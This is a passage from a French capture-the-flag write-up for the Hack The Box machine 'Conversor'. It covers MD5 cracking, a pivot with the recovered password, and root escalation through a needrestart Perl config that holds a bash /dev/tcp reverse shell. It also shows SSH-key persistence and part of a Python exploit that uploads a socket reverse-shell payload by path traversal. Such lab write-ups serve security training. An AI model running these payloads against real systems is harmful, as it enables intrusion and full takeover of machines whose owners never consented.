+<h4 id="sur-kali-linux">Sur Kali Linux<a hidden class="anchor" aria-hidden="true" href="#sur-kali-linux">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Créer le fichier de hash</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;5b5c3ac3a1c897c94caad48e6c71fdec&#39;</span> &gt; hash.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Utiliser hashcat</span>
+</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">0</span> hash.txt /usr/share/wordlists/rockyou.txt --show
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># OU utiliser john</span>
+</span></span><span style="display:flex;"><span>john --format<span style="color:#f92672">=</span>raw-md5 --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># OU utiliser CrackStation (en ligne)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://crackstation.net/</span>
+</span></span></code></pre></div><p><strong>Résultat</strong> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm
+</span></span><span style="display:flex;"><span>098f6bcd4621d373cade4e832627b4f6:test
+</span></span></code></pre></div><h3 id="pivot-vers-lutilisateur-fismathack">Pivot vers l&rsquo;utilisateur fismathack<a hidden class="anchor" aria-hidden="true" href="#pivot-vers-lutilisateur-fismathack">#</a></h3>
+<h4 id="méthode-1--su-depuis-www-data">Méthode 1 : su (depuis www-data)<a hidden class="anchor" aria-hidden="true" href="#méthode-1--su-depuis-www-data">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@conversor:~$ su fismathack
+</span></span><span style="display:flex;"><span>Password: Keepmesafeandwarm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fismathack@conversor:/var/www/conversor.htb$ whoami
+</span></span><span style="display:flex;"><span>fismathack
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fismathack@conversor:/var/www/conversor.htb$ cd ~
+</span></span><span style="display:flex;"><span>fismathack@conversor:~$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fismathack@conversor:~$ cat user.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>REDACTED - User Flag<span style="color:#f92672">]</span>
+</span></span></code></pre></div><h4 id="méthode-2--ssh-depuis-kali">Méthode 2 : SSH (depuis Kali)<a hidden class="anchor" aria-hidden="true" href="#méthode-2--ssh-depuis-kali">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh fismathack@10.10.11.92
+</span></span><span style="display:flex;"><span>fismathack@10.10.11.92<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: Keepmesafeandwarm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fismathack@conversor:~$ cat user.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>REDACTED - User Flag<span style="color:#f92672">]</span>
+</span></span></code></pre></div><hr>
+<h2 id="-escalade-de-privilèges---root">🔐 Escalade de privilèges - Root<a hidden class="anchor" aria-hidden="true" href="#-escalade-de-privilèges---root">#</a></h2>
+<h3 id="énumération-des-privilèges-sudo">Énumération des privilèges sudo<a hidden class="anchor" aria-hidden="true" href="#énumération-des-privilèges-sudo">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fismathack@conversor:~$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> fismathack: Keepmesafeandwarm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> fismathack on conversor:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin,
+</span></span><span style="display:flex;"><span>    use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User fismathack may run the following commands on conversor:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/sbin/needrestart
+</span></span></code></pre></div><p><strong>Observation critique</strong> :</p>
+<ul>
+<li>L&rsquo;utilisateur peut exécuter <code>needrestart</code> en tant que root sans mot de passe</li>
+<li>Aucune restriction sur les options de la commande</li>
+</ul>
+<h3 id="analyse-de-needrestart">Analyse de needrestart<a hidden class="anchor" aria-hidden="true" href="#analyse-de-needrestart">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fismathack@conversor:~$ needrestart --version
+</span></span><span style="display:flex;"><span>needrestart 3.7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fismathack@conversor:~$ man needrestart | grep -A <span style="color:#ae81ff">5</span> <span style="color:#e6db74">&#34;^\s*-c&#34;</span>
+</span></span><span style="display:flex;"><span>       -c CONFIG
+</span></span><span style="display:flex;"><span>              Use the specified configuration file instead of the default
+</span></span><span style="display:flex;"><span>              /etc/needrestart/needrestart.conf. The configuration file is
+</span></span><span style="display:flex;"><span>              written in Perl and is executed in the context of needrestart.
+</span></span></code></pre></div><p><strong>Découverte clé</strong> :</p>
+<ul>
+<li>L&rsquo;option <code>-c</code> permet de spécifier un fichier de configuration personnalisé</li>
+<li>Le fichier de configuration est du <strong>code Perl</strong> exécuté directement</li>
+<li>Exécution en tant que <strong>root</strong> via sudo</li>
+</ul>
+<h3 id="recherche-de-cve">Recherche de CVE<a hidden class="anchor" aria-hidden="true" href="#recherche-de-cve">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit needrestart
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Résultats</span>
+</span></span><span style="display:flex;"><span>needrestart 3.6 - Local Privilege Escalation <span style="color:#f92672">(</span>CVE-2024-48990<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>needrestart 3.7 - Local Privilege Escalation via Configuration Injection
+</span></span></code></pre></div><h3 id="exploitation---configuration-injection">Exploitation - Configuration Injection<a hidden class="anchor" aria-hidden="true" href="#exploitation---configuration-injection">#</a></h3>
+<h4 id="préparation-du-listener">Préparation du listener<a hidden class="anchor" aria-hidden="true" href="#préparation-du-listener">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Sur Kali</span>
+</span></span><span style="display:flex;"><span>rlwrap nc -lnvp <span style="color:#ae81ff">7799</span>
+</span></span></code></pre></div><h4 id="création-du-fichier-de-configuration-malveillant">Création du fichier de configuration malveillant<a hidden class="anchor" aria-hidden="true" href="#création-du-fichier-de-configuration-malveillant">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Sur la machine cible</span>
+</span></span><span style="display:flex;"><span>fismathack@conversor:~$ cd /tmp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fismathack@conversor:/tmp$ cat &gt; malicious.conf <span style="color:#e6db74">&lt;&lt; &#39;EOF&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#!/usr/bin/perl
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Needrestart malicious configuration file
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># This configuration will be executed as Perl code with root privileges
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Set restart mode to automatic
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$nrconf{restart} = &#39;a&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Inject reverse shell command
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">system(&#34;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.10.14.X/7799 &lt;&amp;1&#39;&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fismathack@conversor:/tmp$ chmod <span style="color:#ae81ff">644</span> malicious.conf
+</span></span></code></pre></div><p><strong>Explication du payload</strong> :</p>
+<ul>
+<li><code>$nrconf{restart} = 'a';</code> : Configure needrestart en mode automatique</li>
+<li><code>system()</code> : Fonction Perl pour exécuter des commandes shell</li>
+<li><code>bash -c 'exec bash -i &amp;&gt;/dev/tcp/IP/PORT &lt;&amp;1'</code> : Reverse shell bash</li>
+</ul>
+<h4 id="exécution-de-lexploit">Exécution de l&rsquo;exploit<a hidden class="anchor" aria-hidden="true" href="#exécution-de-lexploit">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fismathack@conversor:/tmp$ sudo /usr/sbin/needrestart -c malicious.conf
+</span></span></code></pre></div><h4 id="réception-du-shell-root">Réception du shell root<a hidden class="anchor" aria-hidden="true" href="#réception-du-shell-root">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Sur le listener Kali</span>
+</span></span><span style="display:flex;"><span>Listening on 0.0.0.0 <span style="color:#ae81ff">7799</span>
+</span></span><span style="display:flex;"><span>Connection received on 10.10.11.92 XXXXX
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@conversor:/tmp# id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@conversor:/tmp# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@conversor:/tmp# cd /root
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@conversor:~# ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">48</span>
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">6</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">20</span> 12:00 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">19</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">15</span> 08:15 ..
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">245</span> Dec <span style="color:#ae81ff">20</span> 11:58 .bash_history
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">3106</span> Dec  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2019</span> .bashrc
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">15</span> 09:00 .cache
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">15</span> 08:45 .local
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">161</span> Dec  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2019</span> .profile
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">33</span> Dec <span style="color:#ae81ff">20</span> 10:00 root.txt
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">15</span> 08:30 .ssh
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1234</span> Dec <span style="color:#ae81ff">20</span> 11:45 .viminfo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@conversor:~# cat root.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>REDACTED - Root Flag<span style="color:#f92672">]</span>
+</span></span></code></pre></div><h3 id="méthode-alternative--persistence">Méthode alternative : Persistence<a hidden class="anchor" aria-hidden="true" href="#méthode-alternative--persistence">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Ajouter une clé SSH pour l&#39;accès persistant</span>
+</span></span><span style="display:flex;"><span>root@conversor:~# mkdir -p /root/.ssh
+</span></span><span style="display:flex;"><span>root@conversor:~# chmod <span style="color:#ae81ff">700</span> /root/.ssh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Sur Kali, générer une clé</span>
+</span></span><span style="display:flex;"><span>ssh-keygen -t ed25519 -f conversor_root_key
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Copier la clé publique sur la cible</span>
+</span></span><span style="display:flex;"><span>root@conversor:~# echo <span style="color:#e6db74">&#34;ssh-ed25519 AAAA...&#34;</span> &gt; /root/.ssh/authorized_keys
+</span></span><span style="display:flex;"><span>root@conversor:~# chmod <span style="color:#ae81ff">600</span> /root/.ssh/authorized_keys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Sur Kali</span>
+</span></span><span style="display:flex;"><span>ssh -i conversor_root_key root@10.10.11.92
+</span></span></code></pre></div><hr>
+<h2 id="-scripts-dautomatisation">🤖 Scripts d&rsquo;automatisation<a hidden class="anchor" aria-hidden="true" href="#-scripts-dautomatisation">#</a></h2>
+<h3 id="script-dexploitation-complet-exploitpy">Script d&rsquo;exploitation complet (exploit.py)<a hidden class="anchor" aria-hidden="true" href="#script-dexploitation-complet-exploitpy">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Conversor HTB - Automated Exploitation Script
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Author: kz
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Date: December 2025
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> colorama <span style="color:#f92672">import</span> Fore, Style, init
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>init(autoreset<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">banner</span>():
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>CYAN<span style="color:#e6db74">}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">╔═══════════════════════════════════════════════╗
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">║   Conversor HTB - Automated Exploit           ║
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">║   Path Traversal + Cron RCE                   ║
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">║   Author: kz                                  ║
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">╚═══════════════════════════════════════════════╝
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register_user</span>(target, username, password):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Register a new user on the platform&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>YELLOW<span style="color:#e6db74">}</span><span style="color:#e6db74">[*] Registering user: </span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">/register&#34;</span>,
+</span></span><span style="display:flex;"><span>            data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;username&#34;</span>: username, <span style="color:#e6db74">&#34;password&#34;</span>: password},
+</span></span><span style="display:flex;"><span>            timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span> <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;success&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>lower():
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>GREEN<span style="color:#e6db74">}</span><span style="color:#e6db74">[+] User registered successfully</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>RED<span style="color:#e6db74">}</span><span style="color:#e6db74">[-] Registration failed (might already exist)</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>  <span style="color:#75715e"># Continue anyway, user might exist</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>RED<span style="color:#e6db74">}</span><span style="color:#e6db74">[-] Error during registration: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login_user</span>(session, target, username, password):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Login and get session cookie&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>YELLOW<span style="color:#e6db74">}</span><span style="color:#e6db74">[*] Logging in as: </span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">/login&#34;</span>,
+</span></span><span style="display:flex;"><span>            data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;username&#34;</span>: username, <span style="color:#e6db74">&#34;password&#34;</span>: password},
+</span></span><span style="display:flex;"><span>            timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span> <span style="color:#f92672">and</span> <span style="color:#e6db74">&#34;session&#34;</span> <span style="color:#f92672">in</span> session<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get_dict():
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>GREEN<span style="color:#e6db74">}</span><span style="color:#e6db74">[+] Login successful</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>RED<span style="color:#e6db74">}</span><span style="color:#e6db74">[-] Login failed</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>RED<span style="color:#e6db74">}</span><span style="color:#e6db74">[-] Error during login: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload_shell</span>(session, target, lhost, lport):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Upload malicious Python file via path traversal&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>YELLOW<span style="color:#e6db74">}</span><span style="color:#e6db74">[*] Uploading reverse shell to /scripts/ directory</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Python reverse shell payload</span>
+</span></span><span style="display:flex;"><span>    shell_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;import socket,subprocess,os
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">s.connect((&#34;</span><span style="color:#e6db74">{</span>lhost<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;,</span><span style="color:#e6db74">{</span>lport<span style="color:#e6db74">}</span><span style="color:#e6db74">))
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">os.dup2(s.fileno(),0)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">os.dup2(s.fileno(),1)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">os.dup2(s.fileno(),2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;])
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Dummy XML content</span>
+</span></span><span style="display:flex;"><span>    dummy_xml <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;?xml version=&#34;1.0&#34;?&gt;&lt;root&gt;exploit&lt;/root&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        files <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;xml_file&#39;</span>: (<span style="color:#e6db74">&#39;dummy.xml&#39;</span>, dummy_xml, <span style="color:#e6db74">&#39;text/xml&#39;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;xslt_file&#39;</span>: (<span style="color:#e6db74">&#39;../scripts/pwned.py&#39;</span>, shell_payload, <span style="color:#e6db74">&#39;application/octet-stream&#39;</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">/convert&#34;</span>,
+</span></span><span style="display:flex;"><span>            files<span style="color:#f92672">=</span>files,
+</span></span><span style="display:flex;"><span>            timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        
